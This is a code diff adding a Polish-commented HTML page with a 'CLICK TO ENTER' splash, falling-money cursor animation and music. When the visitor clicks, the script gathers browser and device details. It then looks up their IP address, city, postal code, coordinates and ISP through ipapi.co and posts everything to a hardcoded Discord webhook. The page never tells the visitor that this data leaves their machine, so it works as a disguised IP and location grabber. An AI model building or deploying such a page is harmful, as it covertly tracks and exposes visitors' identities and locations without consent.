@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body {
+    background-color: black; /* Początkowe tło czarne */
+    cursor: url('card.cur'), auto; /* Początkowy kursor niestandardowy */
+    height: 100vh; 
+    overflow: hidden;
+}
+
+html {
+    height: 100%; 
+}
+
+.pieniadz {
+    position: absolute;
+    width: 144px;
+    height: 140px;
+    background-image: url('pieniadz.webp'); 
+    background-size: cover;
+
+    transform: scale(0.15);
+    transform-origin: center;
+}
+
+.click-to-enter {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    font-size: 16px; 
+    color: white;
+    text-shadow: 0 0 10px white; 
+    cursor: pointer; 
+}
+
+#info { 
+    display: none; 
+    width: 80%; 
+    margin: 20px auto; 
+    border: 1px solid #ccc; 
+    padding: 20px; 
+    background-color: rgba(255, 255, 255, 0.8); 
+    color: black;
+}
+
+.label { font-weight: bold; }
+</style>
+</head>
+<body>
+<div class="click-to-enter">CLICK TO ENTER</div> 
+
+<div id="info"></div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script> 
+<script>
+let ostatniCzas = 0; 
+let animacjaAktywna = true; // Dodana flaga kontrolująca animację
+
+window.addEventListener('mousemove', (event) => { 
+    if (animacjaAktywna) { // Sprawdź, czy animacja jest aktywna
+        const teraz = Date.now();
+        if (teraz - ostatniCzas > 70) { 
+            stwórzPieniadz(event.clientX, event.clientY);
+            ostatniCzas = teraz;
+        }
+    }
+});
+
+function stwórzPieniadz(x, y) {
+    const pieniadz = document.createElement('div');
+    pieniadz.classList.add('pieniadz');
+    document.body.appendChild(pieniadz);
+
+    const pieniadzWidth = pieniadz.offsetWidth;
+    const pieniadzHeight = pieniadz.offsetHeight;
+    const offsetX = pieniadzWidth / 2;
+    const offsetY = pieniadzHeight / 2;
+
+    const przesuniecieWPrawo = 15; 
+    const przesuniecieWDol = 3; 
+
+    gsap.set(pieniadz, { 
+        x: x - offsetX + przesuniecieWPrawo, 
+        y: y - offsetY + przesuniecieWDol,
+        opacity: 0 
+    }); 
+
+    gsap.to(pieniadz, { 
+        duration: 0.5, 
+        opacity: 1,  
+    });
+
+    gsap.to(pieniadz, {
+        duration: 2, 
+        y: window.innerHeight + 50, 
+        rotation: gsap.utils.random(-360, 360),
+        ease: 'power1.inOut',
+        onComplete: () => {
+            pieniadz.remove(); 
+        }
+    });
+}
+
+const clickToEnter = document.querySelector('.click-to-enter');
+const infoDiv = document.getElementById('info');
+
+function displayInfo(label, value) {
+    const p = document.createElement('p');
+    p.innerHTML = `<span class="label">${label}:</span> ${value}`;
+    infoDiv.appendChild(p);
+}
+
+clickToEnter.addEventListener('click', () => {
+    // Odtwarzamy plik audio
+    const audio = new Audio('music.mp3'); 
+    audio.play(); 
+
+    // Zmieniamy tło, kursor i dezaktywujemy animację
+    document.body.style.backgroundColor = 'white';
+    document.body.style.cursor = 'auto';
+    animacjaAktywna = false; // Wyłącz animację
+
+    // Ukrywamy spadające pieniądze
+    const pieniadze = document.querySelectorAll('.pieniadz');
+    pieniadze.forEach(pieniadz => {
+        pieniadz.style.display = 'none';
+    });
+
+    // Zbieranie informacji o systemie
+    const systemInfo = {
+        'Nazwa przeglądarki': navigator.userAgent,
+        'Autonomous System': 'Informacja niedostępna', 
+        'Nazwa platformy': navigator.platform,
+        'Wersja przeglądarki': navigator.appVersion,
+        'Czy to telefon lub tablet': /Mobi|Android/i.test(navigator.userAgent) ? 'Tak' : 'Nie',
+        'Język systemowy': navigator.language,
+        'Rozdzielczość ekranu': screen.width + ' x ' + screen.height,
+        'Display pixel depth': screen.pixelDepth,
+        'Orientacja ekranu': screen.orientation.type,
+        'Rdzenie procesora': navigator.hardwareConcurrency,
+        'Dostępna pamięć przeglądarki': navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Informacja niedostępna',
+        'Dostawca GPU': 'Informacja niedostępna',
+        'Informacje o GPU': 'Informacja niedostępna', 
+    };
+
+    // Pobieranie adresu IP i lokalizacji i wysyłanie wszystkich informacji na webhook
+    fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => {
+            systemInfo['Adres IP'] = data.ip;
+            systemInfo['Kraj'] = data.country_name;
+            systemInfo['Region'] = data.region;
+            systemInfo['Miasto'] = data.city;
+            systemInfo['Kod pocztowy'] = data.postal;
+            systemInfo['Pełna lokalizacja'] = data.latitude + ', ' + data.longitude;
+            systemInfo['Strefa czasowa'] = data.timezone;
+            systemInfo['Aktualna godzina'] = new Date().toLocaleString('pl-PL', { timeZone: data.timezone });
+            systemInfo['ISP'] = data.org;
+
+            // Wysyłanie informacji na webhook Discorda
+            wyslijNaWebhook(systemInfo);
+
+            // Wyświetlanie informacji na stronie (opcjonalne)
+            for (const [key, value] of Object.entries(systemInfo)) {
+                displayInfo(key, value);
+            }
+        })
+        .catch(error => console.error('Błąd pobierania danych lokalizacji:', error));
+
+    // Ukrywamy "Click to Enter" i pokazujemy informacje o systemie
+    clickToEnter.style.display = 'none';
+    infoDiv.style.display = 'block';
+});
+
+function wyslijNaWebhook(systemInfo) {
+    const webhookUrl = 'https://discord.com/api/webhooks/1274466541177409609/lnNWvuRPLkV348OGd0ustZ81HsrR3hho73GXy7OA1tuYtaw56fxBzEklWbz7eFhz0i8N'; // Wpisz tutaj swój adres webhooka
+
+    const embed = {
+        title: 'Informacje o systemie',
+        color: 16711680, // Kolor czerwony
+        fields: [],
+    };
+
+    for (const [key, value] of Object.entries(systemInfo)) {
+        embed.fields.push({
+            name: key,
+            value: value,
+            inline: true,
+        });
+    }
+
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ embeds: [embed] }),
+    })
+    .then(response => {
+        if (!response.ok) {
+            throw new Error('Błąd wysyłania na webhook: ' + response.status);
+        }
+        console.log('Informacje wysłane na Discord!');
+    })
+    .catch(error => console.error(error));
+}
+</script>
+</body>
+</html>
